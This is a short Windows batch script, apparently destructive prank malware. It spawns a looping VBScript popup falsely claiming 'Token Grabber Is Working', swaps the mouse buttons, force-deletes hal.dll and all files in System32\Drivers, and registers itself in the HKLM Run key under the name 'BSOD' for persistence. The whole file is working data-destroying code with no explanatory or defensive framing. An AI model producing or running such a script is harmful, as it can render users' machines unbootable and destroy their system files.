@echo off
echo do>>msg.vbs
echo Msgbox"Token Grabber Is Working",64+1,"Good thing">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
@((( Echo Off > Nul ) & Break Off )
@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
